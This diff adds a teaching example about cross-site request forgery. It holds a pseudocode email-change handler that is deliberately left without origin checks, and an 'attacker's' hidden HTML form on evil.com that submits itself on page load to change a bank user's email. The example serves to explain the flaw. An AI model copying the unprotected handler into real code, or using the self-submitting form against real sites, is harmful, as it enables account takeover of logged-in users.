@@ -1,0 +1,23 @@
+// 1. INSECURE HANDLER (VULNERABLE TO CSRF)
+FUNCTION change_email_INSECURE(request):
+    // Check if the request method is POST
+    IF request.method == "POST":
+        // 1. Authentication: Get user ID from session cookie (assuming user is logged in)
+        user_id = session.get_user_id()
+        
+        // 2. Action: Get new email from request body
+        new_email = request.body.get("email")
+        
+        // 3. Execution: Perform state-changing action without verifying request origin
+        database.update_user_email(user_id, new_email)
+        
+        RETURN "Email successfully updated."
+    ELSE:
+        RETURN "Error: Method not allowed."
+
+// ATTACKER'S CODE (HOSTED ON evil.com)
+// This hidden form, when submitted by a logged-in victim, performs the action
+<form action="https://yourbank.com/change_email_INSECURE" method="POST" id="csrf-form">
+  <input type="hidden" name="email" value="hacked@evil.com">
+</form>
+<script>document.getElementById('csrf-form').submit();</script>
